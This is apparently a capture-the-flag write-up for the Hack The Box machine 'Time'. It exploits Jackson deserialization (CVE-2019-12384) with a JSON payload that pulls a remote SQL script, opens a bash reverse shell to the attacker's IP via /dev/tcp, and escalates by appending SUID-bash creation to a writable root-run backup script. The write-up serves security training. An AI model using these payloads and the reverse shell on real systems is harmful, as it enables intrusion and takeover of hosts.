---
description: 10.10.10.214
---

# Time

![](<../../.gitbook/assets/1 (7).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - The webapp is vulnerable to CVE-2019-12384, which is a Java deserialization attack, specifically the Jackson library which deserializes JSON.  Use this vulnerability to get a shell as "pericles".
* Root - There is a symtemd timer which is running a shell script that is writable by "pericles". Add a line of code to the script to escalate privileges a number of different ways including reverse shell, new user in passwd, new SUID binary etc.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.214                                                                                     2 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 06:45 EST
Nmap scan report for 10.10.10.214
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.58 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 22,80 10.10.10.214 -n                                                     1 ⨯ 2 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 06:46 EST
Nmap scan report for 10.10.10.214
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Online JSON parser
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.38 ms 10.10.14.1
2   16.53 ms 10.10.10.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.214                                                                               2 ⚙
http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]                          
                                                                                          
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.214 -C all                                                                    2 ⚙
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.214
+ Target Hostname:    10.10.10.214
+ Target Port:        80
+ Start Time:         2021-11-24 06:48:00 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 26471 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-11-24 06:57:14 (GMT-5) (554 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.214       2 ⚙
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.214
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/11/24 07:15:13 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2021/11/24 07:21:19 Finished
===============================================================

```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* JSON beautifier webapp on port 80 with two form options
* Nothing in page source

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing in scripts

#### Browsing

Browse the webapp on port 80:

![](<../../.gitbook/assets/2 (4) (1).JPG>)

There are two options to select. If we select "Beautify" with an empty text box we get a "null" error:

![](<../../.gitbook/assets/3 (4).JPG>)

If we select the "Validate(beta)" option with an empty text box, we get a different error:

![](<../../.gitbook/assets/4 (5) (1) (1).JPG>)

> Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input

Let's google the error message. We get the following article which discusses "Jackson\_Deserialization":

{% embed url="https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf" %}

From the above whitepaper:

> Poorly written Java code that deserializes JSON strings from untrusted sources can be vulnerable to a rangeof exploits including remote command execution (RCE), denial-of-service (DoS), and other attacks. Theseattacks are possible when an attacker can control the contents of the JSON to specify the deserialization ofdangerous objects that will invoke specific methods already present in the JVM with attacker-supplied data.
>
> Security researchers have identified a wide-variety of existing classes that can be used to violate the securitypolicies of a vulnerable Java program. These classes are often referred to asgadgetsbecause they aresimilar to gadgets in return-oriented programming \[Sha07]. Gadgets consist of existing, executable codepresent in the vulnerable process that can be maliciously repurposed by an attacker. In the case of Jacksondeserialization vulnerabilities, these classes contain code that is executed when an object is deserialized.

## Gaining Access

A google search for "jackson exploit" finds the following article, which details how to exploit this vulnerability:

{% embed url="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" %}

Reading through the article, the author gives us the following payload:

> \["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE\_LEVEL\_SYSTEM\_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]

We need to modify it with out attacker IP and start a web server.&#x20;

First, start a webserver. Next, paste the updated payload into the text box with the "Validate" option selected and click "Process".

> \["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE\_LEVEL\_SYSTEM\_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.3:8000/inject.sql'"}]

The web server gets a hit:

```
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.214 - - [24/Nov/2021 10:41:16] code 404, message File not found
10.10.10.214 - - [24/Nov/2021 10:41:16] "GET /inject.sql HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.

```

Let's create the inject.sql file and copy the following code into it as per the article:

> CREATE ALIAS SHELLEXEC AS \$$ String shellexec(String cmd) throws java.io.IOException { String\[] command = {"bash", "-c", cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }
>
> \$$;
>
> CALL SHELLEXEC('id > exploited.txt')

We'll need to modify the command we want to execute, as shown below:

```
└─$ cat inject.sql                                                                   
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.3/8585 0>&1')
                                                                               
```

Next, start the web server again and start a netcat listener, then paste the following command into the webapp with the "Validate" option selected and click "Process". In our listener, we get a shell as user "pericles", and we can grab the user flag.

```
└─$ nc -nvlp 8585
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8585
Ncat: Listening on 0.0.0.0:8585
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:44362.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ id
id                                                                                                                
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)      
pericles@time:/var/www/html$ cd ~
cd ~
pericles@time:/home/pericles$ ls
ls
linpeas.sh  snap  test  user.txt
pericles@time:/home/pericles$ cat user.txt
cat user.txt
9d2edff1efc6fe7f3be329eecf6880eb
pericles@time:/home/pericles$ 
```

## Enumeration as "pericles"

Let's gather some basic system information:

```
pericles@time:/home/pericles$ uname -a; cat /etc/*-release; netstat -antp;
uname -a; cat /etc/*-release; netstat -antp;
Linux time 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04 LTS"
NAME="Ubuntu"
VERSION="20.04 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0    930 10.10.10.214:44362      10.10.14.3:8585         ESTABLISHED 28486/bash          
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -          
pericles@time:/home/pericles$ 
```

Let's check for SUID binaries and see if we can run any sudo commands.

```
pericles@time:/home/pericles$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/snap/snapd/9721/usr/lib/snapd/snap-confine
/snap/snapd/9607/usr/lib/snapd/snap-confine
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
pericles@time:/home/pericles$ sudo -l
sudo -l
[sudo] password for pericles: 
^C
pericles@time:/home/pericles$ 
```

Let's check for cron jobs and systemd timer jobs:

```
pericles@time:/home/pericles$ ls -la /etc/cron*
ls -la /etc/cron*
-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Sep 21  2020 .
drwxr-xr-x 102 root root 4096 Feb 10  2021 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Sep 21  2020 .
drwxr-xr-x 102 root root 4096 Feb 10  2021 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 102 root root 4096 Feb 10  2021 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 102 root root 4096 Feb 10  2021 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 102 root root 4096 Feb 10  2021 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  211 Apr  2  2020 update-notifier-common
pericles@time:/home/pericles$ 

pericles@time:/home/pericles$ systemctl status *timer
systemctl status *timer
● systemd-tmpfiles-clean.timer - Daily Cleanup of Temporary Directories
     Loaded: loaded (/lib/systemd/system/systemd-tmpfiles-clean.timer; static; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 12:02:29 UTC; 20h left
   Triggers: ● systemd-tmpfiles-clean.service
       Docs: man:tmpfiles.d(5)
             man:systemd-tmpfiles(8)

Warning: some journal files were not opened due to insufficient permissions.
● apt-daily-upgrade.timer - Daily apt upgrade and clean activities
     Loaded: loaded (/lib/systemd/system/apt-daily-upgrade.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 06:19:04 UTC; 14h left
   Triggers: ● apt-daily-upgrade.service

Warning: some journal files were not opened due to insufficient permissions.
● man-db.timer - Daily man-db regeneration
     Loaded: loaded (/lib/systemd/system/man-db.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 00:00:00 UTC; 8h left
   Triggers: ● man-db.service
       Docs: man:mandb(8)

Warning: some journal files were not opened due to insufficient permissions.
● e2scrub_all.timer - Periodic ext4 Online Metadata Check for All Filesystems
     Loaded: loaded (/lib/systemd/system/e2scrub_all.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Sun 2021-11-28 03:10:08 UTC; 3 days left
   Triggers: ● e2scrub_all.service

Warning: some journal files were not opened due to insufficient permissions.
● phpsessionclean.timer - Clean PHP session files every 30 mins
     Loaded: loaded (/lib/systemd/system/phpsessionclean.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Wed 2021-11-24 16:09:00 UTC; 9min left
   Triggers: ● phpsessionclean.service

Warning: some journal files were not opened due to insufficient permissions.
● apt-daily.timer - Daily apt download activities
     Loaded: loaded (/lib/systemd/system/apt-daily.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 05:47:15 UTC; 13h left
   Triggers: ● apt-daily.service

Warning: some journal files were not opened due to insufficient permissions.
● logrotate.timer - Daily rotation of log files
     Loaded: loaded (/lib/systemd/system/logrotate.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 00:00:00 UTC; 8h left
   Triggers: ● logrotate.service
       Docs: man:logrotate(8)
             man:logrotate.conf(5)

Warning: some journal files were not opened due to insufficient permissions.
● timer_backup.timer - Backup of the website
     Loaded: loaded (/etc/systemd/system/timer_backup.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 15:59:01 UTC; 23s ago
    Trigger: Wed 2021-11-24 15:59:31 UTC; 6s left
   Triggers: ● timer_backup.service

● motd-news.timer - Message of the Day
     Loaded: loaded (/lib/systemd/system/motd-news.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Thu 2021-11-25 03:54:51 UTC; 11h left
   Triggers: ● motd-news.service

Warning: some journal files were not opened due to insufficient permissions.
● fstrim.timer - Discard unused blocks once a week
     Loaded: loaded (/lib/systemd/system/fstrim.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Mon 2021-11-29 00:00:00 UTC; 4 days left
   Triggers: ● fstrim.service
       Docs: man:fstrim

Warning: some journal files were not opened due to insufficient permissions.
● fwupd-refresh.timer - Refresh fwupd metadata regularly
     Loaded: loaded (/lib/systemd/system/fwupd-refresh.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Wed 2021-11-24 11:47:38 UTC; 4h 11min ago
    Trigger: Wed 2021-11-24 18:24:58 UTC; 2h 25min left
   Triggers: ● fwupd-refresh.service

Warning: some journal files were not opened due to insufficient permissions.pericles@time:/home/pericles$ 

pericles@time:/home/pericles$
```

There don't appear to be any interesting cron jobs, however, the systemd timer output has an entry for backing up the webroot which appears to be running with a very short timer. Let's investigate by having a look at the timer config file:

```
pericles@time:/home/pericles$ cat /etc/systemd/system/timer_backup.timer
cat /etc/systemd/system/timer_backup.timer
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
pericles@time:/home/pericles$ cat /etc/systemd/system/timer_backup.service                  
cat /etc/systemd/system/timer_backup.service
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
pericles@time:/home/pericles$ cat /etc/systemd/system/web_backup.service  
cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
pericles@time:/home/pericles$ 

```

We see that the timerbackup.timer is calling the timerbackup.service which in turn is calling the web\_backup.service, which runs the timer\_backup.sh script. Let's have a look at this script:

```
pericles@time:/home/pericles$ ls -la /usr/bin/timer_backup.sh
ls -la /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Nov 24 16:05 /usr/bin/timer_backup.sh
pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
pericles@time:/home/pericles$ 
```

We can write to the script, which means we should be able to escalate our privileges.​ ​ ​

## Privilege Escalation

Let's add a line to the script as follows:​&#x20;

> echo 'cp /usr/bin/bash /home/pericles/priv; chown root:root /home/pericles/priv; chmod u+s /home/pericles/priv' >> /usr/bin/timer\_backup.sh

```
pericles@time:/home/pericles$ echo 'cp /usr/bin/bash /home/pericles/priv; chown root:root /home/pericles/priv; chmod u+s /home/pericles/priv' >> /usr/bin/timer_backup.sh
<+s /home/pericles/priv' >> /usr/bin/timer_backup.sh
pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
cp /usr/bin/bash /home/pericles/priv; chown root:root /home/pericles/priv; chmod u+s /home/pericles/priv
pericles@time:/home/pericles$
```

After a few seconds, we can see the file is in the user's home directory:

```
pericles@time:/home/pericles$ ls -l
ls -l
total 1628
-rwsr-xr-x 1 root     root     1183448 Nov 24 16:08 priv
drwxr-xr-x 3 pericles pericles    4096 Oct  2  2020 snap
-r-------- 1 pericles pericles      33 Nov 24 11:47 user.txt
pericles@time:/home/pericles$
```

​ ​All we need to do now is run it and we can grab the root flag.

```
pericles@time:/home/pericles$ ./priv -p
./priv -p
priv-5.0# id
id
uid=1000(pericles) gid=1000(pericles) euid=0(root) groups=1000(pericles)
priv-5.0# cd /root
cd /root
priv-5.0# cat root.txt
cat root.txt
6b3ade392fa3e24f4fafb34a624d6a6f
priv-5.0# c

```

## Resources

{% embed url="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" %}

{% embed url="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" %}

{% embed url="https://github.com/jas502n/CVE-2019-12384" %}

{% embed url="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525" %}

{% embed url="https://github.com/jault3/jackson-databind-exploit" %}

{% embed url="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96" %}

{% embed url="https://github.com/mbechler/marshalsec" %}
